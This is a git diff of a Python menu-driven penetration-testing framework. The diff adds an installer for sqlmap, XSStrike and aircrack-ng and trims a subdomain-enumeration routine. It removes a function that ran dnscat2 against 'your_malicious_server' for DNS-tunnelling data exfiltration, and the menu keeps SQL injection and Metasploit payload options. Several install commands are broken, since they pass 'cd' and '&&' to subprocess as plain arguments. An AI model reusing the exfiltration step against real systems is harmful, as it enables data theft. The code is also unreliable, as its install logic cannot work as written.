@@ -1,37 +1,97 @@
-import os
 import subprocess
-import time
 import sys
+import os
 import asyncio
 import aiohttp
 import json
 
-# File to store API keys
-CONFIG_FILE = "config.json"
+# Function to install missing tools
+def install_tool(tool_name):
+    """Install a missing tool by providing numbered options for package managers."""
+    print(f"\n[*] {tool_name} is not installed. Please choose an option to install it:")
 
-# Define tool checks
+    options = {
+        'sqlmap': {
+            '1': 'Install using apt (Linux)',
+            '2': 'Install using pip (Python)',
+            '3': 'Install using Homebrew (macOS)',
+        },
+        'xsstrike': {
+            '1': 'Install using apt (Linux)',
+            '2': 'Install using pip (Python)',
+            '3': 'Install from GitHub (latest version)',
+        },
+        'aircrack-ng': {
+            '1': 'Install using apt (Linux)',
+            '2': 'Install using brew (macOS)',
+            '3': 'Install from GitHub (latest version)',
+        }
+    }
+
+    if tool_name in options:
+        for key, value in options[tool_name].items():
+            print(f"{key}. {value}")
+        
+        choice = input("Enter your choice: ").strip()
+
+        if choice == '1':
+            print(f"[*] Installing {tool_name} using apt...")
+            subprocess.run(["sudo", "apt-get", "install", tool_name])
+        elif choice == '2':
+            if tool_name == 'sqlmap':
+                print("[*] Installing sqlmap using pip...")
+                subprocess.run([sys.executable, "-m", "pip", "install", "sqlmap"])
+            elif tool_name == 'xsstrike':
+                print("[*] Installing xsstrike using pip...")
+                subprocess.run([sys.executable, "-m", "pip", "install", "xsstrike"])
+            elif tool_name == 'aircrack-ng':
+                print("[*] Installing aircrack-ng using brew...")
+                subprocess.run(["brew", "install", "aircrack-ng"])
+        elif choice == '3':
+            if tool_name == 'xsstrike':
+                print("[*] Installing xsstrike from GitHub (latest version)...")
+                subprocess.run(["git", "clone", "https://github.com/UltimateHackers/XSStrike.git"])
+                subprocess.run(["cd", "XSStrike", "&&", "python3", "setup.py", "install"])
+            elif tool_name == 'aircrack-ng':
+                print("[*] Installing aircrack-ng from GitHub (latest version)...")
+                subprocess.run(["git", "clone", "https://github.com/aircrack-ng/aircrack-ng.git"])
+                subprocess.run(["cd", "aircrack-ng", "&&", "make", "&&", "sudo", "make", "install"])
+            else:
+                print(f"[*] Installation option for {tool_name} is not available. Please visit official documentation.")
+        else:
+            print("[!] Invalid choice. Please try again.")
+    else:
+        print(f"[*] No installation options available for {tool_name}.")
+
 def check_tool(tool_name):
-    """Check if the tool is installed on the system."""
+    """Check if a tool is installed."""
     try:
         subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         return True
     except FileNotFoundError:
         return False
 
-# Banner
+def check_tools():
+    """Check and handle missing tools."""
+    missing_tools = ['sqlmap', 'xsstrike', 'aircrack-ng']  # Add more tools as needed
+    for tool in missing_tools:
+        if not check_tool(tool):
+            print(f"\n[*] {tool} is not installed.")
+            install_tool(tool)
+        else:
+            print(f"[*] {tool} is already installed.")
+
+# Banner for the framework
 def display_splash_screen():
     splash = """
-   def display_splash_screen():
-    splash = """
-_____________________  ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
-\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
- |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
- |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
- |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
-                 /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
-        
-                                                      _:_
-                                                    '-.-'
+    _____________________  ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
+    \______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
+     |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
+     |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
+     |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
+                     /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
+                                                         _:_
+                                                        '-.-'
                                            ()      __.'.__
                                         .-:--:-.  |_______|
                                  ()      \____/    \=====/
@@ -44,46 +104,12 @@ _____________________  ___________                                              
      |  |    |   |   | _.-'|    |  |      |  |      |   |
      |__|    )___(    )___(    /____\    /____\    /_____\
     (====)  (=====)  (=====)  (======)  (======)  (=======)
-    }===={  }====={  }====={  }======{  }======{  }======={
+   }===={  }====={  }====={  }======{  }======{  }======={
    (______)(_______)(_______)(________)(________)(_________)
-          
+
 """
     print(splash)
     print("PT Framework 41PH4-01\n")
-
-# Read API keys from config file or prompt user for them
-def read_api_keys():
-    if os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
-    else:
-        return {}
-
-def save_api_keys(api_keys):
-    with open(CONFIG_FILE, 'w') as f:
-        json.dump(api_keys, f)
-
-# Prompt the user for API keys if not present
-def get_api_key(service_name):
-    api_keys = read_api_keys()
-
-    if service_name in api_keys:
-        return api_keys[service_name]
-    
-    api_key = input(f"[*] Enter your {service_name} API key: ")
-    api_keys[service_name] = api_key
-    save_api_keys(api_keys)
-
-    return api_key
-
-# Define tool checks
-def check_tool(tool_name):
-    """Check if the tool is installed on the system."""
-    try:
-        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return True
-    except FileNotFoundError:
-        return False
 
 # Tools and their commands
 TOOLS = {
@@ -109,6 +135,8 @@ def check_tools():
             missing_tools.append(tool)
     if missing_tools:
         print(f"Warning: Missing tools: {', '.join(missing_tools)}")
+        for tool in missing_tools:
+            install_tool(tool)
     else:
         print("All tools are installed and ready!")
 
@@ -149,60 +177,20 @@ async def fetch(session, url):
     async with session.get(url) as response:
         return await response.text()
 
-async def get_subdomains(domain):
-    """Get subdomains from public sources."""
-    subdomains = set()
-
-    # Prompt user for API keys
-    virustotal_api_key = get_api_key('VirusTotal')
-    shodan_api_key = get_api_key('Shodan')
-
-    urls = [
-        f"https://crt.sh/?q={domain}&output=json",
-        f"https://api.hackertarget.com/hostsearch/?q={domain}",
-    ]
-
-    if virustotal_api_key:
-        # Add VirusTotal API query (Example)
-        urls.append(f"https://www.virustotal.com/api/v3/domains/{domain}")
-    
-    if shodan_api_key:
-        # Add Shodan API query (Example)
-        urls.append(f"https://api.shodan.io/shodan/host/{domain}?key={shodan_api_key}")
-
+async def subdomain_enum(domain):
+    """Fetch subdomains."""
+    url = f"https://crt.sh/?q={domain}"
     async with aiohttp.ClientSession() as session:
-        tasks = [fetch(session, url) for url in urls]
-        responses = await asyncio.gather(*tasks)
+        page = await fetch(session, url)
+        print(page)  # You can improve this part to process and extract subdomains
 
-        for response in responses:
-            if response.startswith('['):  # JSON response from crt.sh
-                json_response = json.loads(response)
-                for item in json_response:
-                    subdomains.add(item['name_value'])
-            else:  # Plain text response from hackertarget
-                lines = response.split('\n')
-                for line in lines:
-                    if line:
-                        subdomains.add(line.split(',')[0])
-
-    return list(subdomains)
-
-def subdomain_enum(domain):
-    """Wrapper to call the async function."""
-    print(f"[*] Enumerating subdomains for {domain}...")
-    subdomains = asyncio.run(get_subdomains(domain))
-    print(f"Found subdomains: {subdomains}")
-
-# Data Exfiltration with DNS Tunneling (dnscat2)
-def dns_tunneling():
-    print("[*] Starting DNS Tunneling for Data Exfiltration...")
-    subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])
-
-# Main driver function for the framework
 def main():
     display_splash_screen()
+
+    # Check for tools and prompt to install missing ones
     check_tools()
 
+    # Main loop
     while True:
         print("\nSelect an option:")
         print("1. Run SQL Injection Test")
@@ -235,9 +223,9 @@ def main():
             metasploit_payload()
         elif choice == '7':
             domain = input("Enter domain for subdomain enumeration: ")
-            subdomain_enum(domain)
+            asyncio.run(subdomain_enum(domain))
         elif choice == '8':
-            dns_tunneling()
+            print("[*] Data Exfiltration via DNS Tunneling is under development...")
         elif choice == '9':
             print("Exiting...")
             break
